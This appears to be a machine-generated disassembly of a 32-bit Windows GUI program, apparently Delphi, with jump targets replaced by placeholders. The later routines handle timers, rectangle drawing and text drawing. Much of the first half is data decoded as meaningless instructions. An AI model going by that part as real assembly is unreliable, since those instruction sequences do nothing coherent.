add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
inc esp
cmp [ ebx ] al
pop eax
cmp eax [ ebx ]
add al 0x3a
inc ebx
add [ ebx + edi * 2 + 0x5cc40043 ] al
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ ebp + esi * 2 + 0x42 ] dh
add [ eax + 0x68 ] dh
inc ebx
add [ eax ] dl
jbe r-xdata
add [ edx + ebx * 2 + 0x43 ] al
add [ eax + 0x2e ] al
inc ebx
add [ ecx + 0x43 ] ah
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x6083ffbf ] dl
add [ esi + edi + 0x41 ] bl
inc ebx
insd
add [ eax ] al
add al cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x2280042 ] bh
add [ eax ] al
sub [ ebx + 0x42 ] ah
add [ edx + 0x41 ] bh
add bh bh
and [ ebp + 0x42 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
inc ebx
add [ ebp + esi * 2 + 0x43 ] ah
add [ esi * 2 - 0x5e7bffbd ] cl
inc ebx
add [ eax ] bh
mov ebp 0x77340043
inc edx
add [ eax ] al
sahf
inc ebx
add al dh
mov al [ 0x73600043 ]
inc edx
add [ esi ] al
push esp
push eax
popad
outsb
insb
nop
enter 0x4265 0x0
pop es
push es
insd
push eax
popad
outsb
insb
je r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
push edi
sbb [ 0x5f0041 ] cl
add bh bh
jo r-xdata
outsd
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ eax ] bl
out 0x42 al
add [ ebx ] bl
add bh bh
test [ esi ] ch
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
int3
add [ eax + 0x5c004374 ] dh
inc edx
add [ eax ] bl
add al [ ebx ]
or eax [ eax ]
or [ ebp + 0x78 ] al
je r-xdata
inc ebx
jb r-xdata
add dh bh
xchg esp eax
cmp al [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0xfbb86564
inc edx
add [ eax ] bl
add al [ eax ]
add [ eax ] al
adc [ edx ] 0x0
insb
dec ecx
outsb
outsb
jb r-xdata
xor [ eax ] al
call 0xffffffff8842a8ad
lodsb [ esi ]
inc ebx
call 0xffffffff8842a861
xor [ eax ] al
movsb [ edi ] [ esi ]
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
je r-xdata
sti
inc edx
add [ edx ] dl
add al [ eax ]
inc [ esi * 2 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x4f00ffff ] ah
mov [ 0xffffffffa2d40043 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
call 0x7042aa3d
cmp [ ebx ] eax
mov al [ 0xffffffff84004339 ]
pop ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
call 0x142a8ef
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec edi
jne r-xdata
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi + 0x4ff0001 ] ah
movsb [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_41b118
jo r-xdata
add [ eax ] al
call [ esi ]
jb r-xdata
sbb al 0x2
add bh bh
pop eax
jne r-xdata
jb r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ eax - 0x4d ] dl
inc ebx
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ 0x6f6c6f43 ] al
jb r-xdata
add bh bh
adc [ ebx ] bh
inc ebx
inc ebx
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
cmp eax [ ebx ]
sub al 0x3b
in eax dx
inc edx
add [ eax + eax ] dh
[ esi + ebx * 2 + 0x43 ]
add [ ecx ] al
add [ ebx + edi ] ch
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
call [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cld
inc edx
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x64ff0000
cmp al [ ebx ]
je r-xdata
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
in al dx
inc edx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
add dh ah
adc [ eax ] al
test al 0x1
add bh bh
dec esp
lea eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
push eax
mov bl 0x43
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
or al 0xa3
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
xor [ eax ] 0x0
jpe r-xdata
popad
outsb
push edx
jae r-xdata
jb r-xdata
nop
cmp [ ebx ] al
add al 0x5a
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xd0656c62
inc edx
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
jo r-xdata
adc [ eax ] al
0xe4ff0000 0x433a
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
xor al 0x3b
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9416bc6
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
pushad
push cs
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
jmp [ ebx + 0x10043 ]
outsb
jne r-xdata
jo r-xdata
outsd
add [ es : edx ] cl
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
pushfd
cmp al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov [ 0xffffffffa38c0043 ] eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
and eax 0x61500b00
jb r-xdata
adc [ eax ] al
test eax 0xe0ff0001
mov [ 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc esp
jb r-xdata
nop
push eax
outsd
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc eax
cmp al [ ebx ]
mov [ edx ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
sub [ eax + eax + 0x7c ] eax
add [ eax ] al
[ eax ]
inc edi
je r-xdata
pushad
push cs
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] al
jo r-xdata
sub [ eax ] al
inc ebx
add [ ebx + 0x10043 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
in al dx
inc edx
add [ ebx ] cl
movsb [ edi ] [ esi ]
out dx al
inc edx
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xa46f666e
out dx al
inc edx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec edi
jb r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
int1
inc edx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
inc edx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
push cs
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
jo r-xdata
clc
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
jb r-xdata
sbb al 0xef
inc edx
add al bl
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc esp
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
jb r-xdata
int1
inc edx
add [ eax - 0x4700ffff ] bh
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d044
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d7cc
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d044
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d7cc
pop ebx
mov esp ebp
pop ebp
retn
inc esp
outsd
arpl [ ebx - 0x10 ] bp
dec ebp
outsd
jbe r-xdata
inc edx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
xor [ edi ] 0x0
or [ edi + 0x6e ] ecx
int1
inc edx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x38 ] bp
int1
inc edx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
xor [ 0x6e4f0a00 ] 0x44
push cs
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
je r-xdata
sub_426dbc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d044
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d7cc
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d044
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d7cc
pop ebx
mov esp ebp
pop ebp
retn
sub_426e80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41d150
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_426dbc
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_426ee0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419b0c
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_426f68
call sub_41ac58
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_426f30
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_426fdc
mov eax [ esi + 0x34 ]
call sub_41ad0c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419b58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_426f68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_426fa2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_426fdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42705b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427062
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
sub_4270b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43bc8c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_428284
call sub_428364
test al al
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov edx 0xb9
mov eax esi
call sub_43312c
mov edx 0x29
mov eax esi
call sub_433150
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_427504
mov edx 0x1
mov eax esi
call sub_427520
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_433b10
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_43a404
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_427178
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436ffc
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4271e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_439788
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_437710
sub_427228
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_427318
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_433970
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_43864c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42731f
lea eax [ ebp - 0x14 ]
call sub_403eac
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_43a170
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_43a170
push eax
call InvalidateRect
sub_427328
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_427360
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4274c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_426e80
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_427328
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_426e80
mov esi [ ebx + 0x208 ]
call sub_428284
call sub_428364
test al al
je r-xdata
push ebp
call sub_427328
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_426e80
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d324
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41d6c8
mov eax ebx
call sub_43b350
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_435c68
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x1c ]
call sub_40436c
push eax
mov eax esi
call sub_41dadc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4274c9
lea eax [ ebp - 0x1c ]
call sub_403eac
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d440
